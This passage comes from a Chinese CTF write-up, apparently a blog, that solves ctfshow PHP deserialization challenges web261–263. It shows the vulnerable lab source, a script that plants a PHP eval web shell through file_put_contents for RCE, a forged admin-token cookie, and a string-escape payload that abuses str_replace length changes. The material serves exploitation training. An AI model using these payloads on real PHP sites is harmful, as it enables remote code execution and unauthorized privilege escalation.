class=\"variable language_\">$this</span>-&gt;username=<span class=\"variable\">$data</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password=<span class=\"variable\">$data</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;code = <span class=\"variable language_\">$this</span>-&gt;username.<span class=\"variable language_\">$this</span>-&gt;password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;code==<span class=\"number\">0x36d</span>)&#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$this</span>-&gt;username, <span class=\"variable\">$this</span>-&gt;password);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure>\n<p>​\t\t先扔一个考点：</p>\n<blockquote>\n<p>如果类中同时定义了 __unserialize () 和 __wakeup () 两个魔术方法， 则只有 __unserialize () 方法会生效，__wakeup () 方法会被忽略。</p>\n</blockquote>\n<p>​\t\t所以不用搭理 <code>__wakeup</code>  直接打木马：</p>\n<p>​\t\t因为存在 file_put_contents，所以只需要将木马写入文件里即可，然后就是 <code>__destruct</code> ，在脚本跑完的时候会自动执行，所以完全可以触发，之后，有一个 if ($this-&gt;code==0x36d ，需要想办法通过，因为是弱比较，所以可以利用这个 PHP 的特性，先执行下这个：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"number\">0x36d</span> == <span class=\"string\">&quot;877.php&quot;</span>;</span><br></pre></td></tr></table></figure>\n<p>​\t\t发现输出结果是 1，好了，可以直接梭了：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ctfshowvip</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username=<span class=\"string\">&#x27;877.php&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password=<span class=\"string\">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">ctfshowvip</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后访问 877.php 直接 RCE 即可。</p>\n<h1 id=\"web262\"><a class=\"markdownIt-Anchor\" href=\"#web262\">#</a> web262：</h1>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Author</span>: h1xa</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Last</span> Modified by:   h1xa</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@message</span>.php</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@email</span>: h1xa<span class=\"doctag\">@ctfer</span>.com</span></span><br><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">@link</span>: https://ctfer.com</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">message</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$from</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$msg</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$to</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$token</span>=<span class=\"string\">&#x27;user&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$f</span>,<span class=\"variable\">$m</span>,<span class=\"variable\">$t</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">from</span> = <span class=\"variable\">$f</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;msg = <span class=\"variable\">$m</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;to = <span class=\"variable\">$t</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$f</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;f&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$m</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;m&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$t</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;t&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$f</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$m</span>) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$t</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">message</span>(<span class=\"variable\">$f</span>,<span class=\"variable\">$m</span>,<span class=\"variable\">$t</span>);</span><br><span class=\"line\">    <span class=\"variable\">$umsg</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;fuck&#x27;</span>, <span class=\"string\">&#x27;loveU&#x27;</span>, <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$msg</span>));</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">&#x27;msg&#x27;</span>,<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$umsg</span>));</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Your message has been sent&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n<p>​\t\t文档注释给了信息，有一个 message.php 文件，访问下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">message</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$from</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$msg</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$to</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$token</span>=<span class=\"string\">&#x27;user&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$f</span>,<span class=\"variable\">$m</span>,<span class=\"variable\">$t</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">from</span> = <span class=\"variable\">$f</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;msg = <span class=\"variable\">$m</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;to = <span class=\"variable\">$t</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;msg&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;msg&#x27;</span>]));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$msg</span>-&gt;token==<span class=\"string\">&#x27;admin&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t有两个方法，这里先用</p>\n<p>​\t\t<strong>直接反序列化：</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">message</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$from</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$msg</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$to</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$token</span>=<span class=\"string\">&#x27;admin&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">message</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br></pre></td></tr></table></figure>\n<p>​\t\t直接通过 cookie 传一个 msg 上去即可得到 flag</p>\n<p>​\t\t<strong>字符串逃逸:</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">message</span></span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> <span class=\"variable\">$from</span>;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> <span class=\"variable\">$msg</span>;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> <span class=\"variable\">$to</span>;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> <span class=\"variable\">$token</span>=<span class=\"string\">&#x27;user&#x27;</span>;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$f</span>,<span class=\"variable\">$m</span>,<span class=\"variable\">$t</span></span>)</span>&#123;</span><br><span class=\"line\">       <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">from</span> = <span class=\"variable\">$f</span>;</span><br><span class=\"line\">       <span class=\"variable language_\">$this</span>-&gt;msg = <span class=\"variable\">$m</span>;</span><br><span class=\"line\">       <span class=\"variable language_\">$this</span>-&gt;to = <span class=\"variable\">$t</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$f</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"variable\">$m</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"variable\">$t</span> = <span class=\"string\">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">message</span>(<span class=\"variable\">$f</span>,<span class=\"variable\">$m</span>,<span class=\"variable\">$t</span>);</span><br><span class=\"line\"><span class=\"variable\">$umsg</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;fuck&#x27;</span>, <span class=\"string\">&#x27;loveU&#x27;</span>, <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$msg</span>));</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$umsg</span> ;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$umsg</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#palyoad:f=1&amp;m=1&amp;t=1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"web263\"><a class=\"markdownIt-Anchor\" href=\"#web263\">#</a> web263:</h1>\n<p>​\t\t一上来是个登录框，听说考点是 session 反序列化，先贴一个文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vR1RMLUpVL3AvMTY4NTkwOTguaHRtbA==\">session 反序列化</span></p>\n<p>​\t\t首先，访问 www.zip 获取源码。</p>\n<p>​\t\tindex.php：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-03 16:28:37</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-06 19:21:45</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\"></span><br><span class=\"line\">*/</span><br><span class=\"line\">\terror_reporting(0);</span><br><span class=\"line\">\tsession_start();</span><br><span class=\"line\">\t//超过5次禁止登陆</span><br><span class=\"line\">\tif(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class=\"line\">\t\t$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class=\"line\">\t\t$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class=\"line\">\t&#125;else&#123;</span><br><span class=\"line\">\t\t setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class=\"line\">\t\t $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">\t&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">\t&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class=\"line\">\t&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1,maximum-scale=1, minimum-scale=1&quot;&gt;</span><br><span class=\"line\">\t&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class=\"line\">\t&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;</span><br><span class=\"line\">\t&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;</span><br><span class=\"line\">\t&lt;title&gt;ctfshow登陆&lt;/title&gt;</span><br><span class=\"line\">\t&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;div class=&quot;pc-kk-form&quot;&gt;</span><br><span class=\"line\">\t\t&lt;center&gt;&lt;h1&gt;CTFshow 登陆&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">\t\t&lt;form action=&quot;&quot; onsubmit=&quot;return false;&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class=\"line\">\t\t\t\t&lt;input id=&quot;u&quot; type=&quot;text&quot; placeholder=&quot;用户名&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;/div&gt;</span><br><span class=\"line\">\t\t\t&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class=\"line\">\t\t\t\t&lt;input id=&quot;pass&quot; type=&quot;password&quot; placeholder=&quot;密码&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;/div&gt;</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t\t&lt;div class=&quot;pc-kk-form-btn&quot;&gt;</span><br><span class=\"line\">\t\t\t\t&lt;button onclick=&quot;check();&quot;&gt;登陆&lt;/button&gt;</span><br><span class=\"line\">\t\t\t&lt;/div&gt;</span><br><span class=\"line\">\t\t&lt;/form&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tfunction check()&#123;</span><br><span class=\"line\">\t\t\t$.ajax(&#123;</span><br><span class=\"line\">\t\t\turl:&#x27;check.php&#x27;,</span><br><span class=\"line\">\t\t\ttype: &#x27;GET&#x27;,</span><br><span class=\"line\">\t\t\tdata:&#123;</span><br><span class=\"line\">\t\t\t\t&#x27;u&#x27;:$(&#x27;#u&#x27;).val(),</span><br><span class=\"line\">\t\t\t\t&#x27;pass&#x27;:$(&#x27;#pass&#x27;).val()</span><br><span class=\"line\">\t\t\t&#125;,</span><br><span class=\"line\">\t\t\tsuccess:function(data)&#123;</span><br><span class=\"line\">\t\t\t\talert(JSON.parse(data).msg);</span><br><span class=\"line\">\t\t\t&#125;,</span><br><span class=\"line\">\t\t\terror:function(data)&#123;</span><br><span class=\"line\">\t\t\t\talert(JSON.parse(data).msg);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\tindex.php 里主要的 php 逻辑：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\t<span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\">\t<span class=\"comment\">//超过5次禁止登陆</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;limit&#x27;</span>]))&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;limti&#x27;</span>]&gt;<span class=\"number\">5</span>?<span class=\"keyword\">die</span>(<span class=\"string\">&quot;登陆失败次数超过限制&quot;</span>):<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;limit&#x27;</span>]=<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;limit&#x27;</span>]);</span><br><span class=\"line\">\t\t<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;limit&#x27;</span>] = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;limit&#x27;</span>]) +<span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t <span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">&quot;limit&quot;</span>,<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"string\">&#x27;1&#x27;</span>));</span><br><span class=\"line\">\t\t <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;limit&#x27;</span>]= <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\tcheck.php：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span 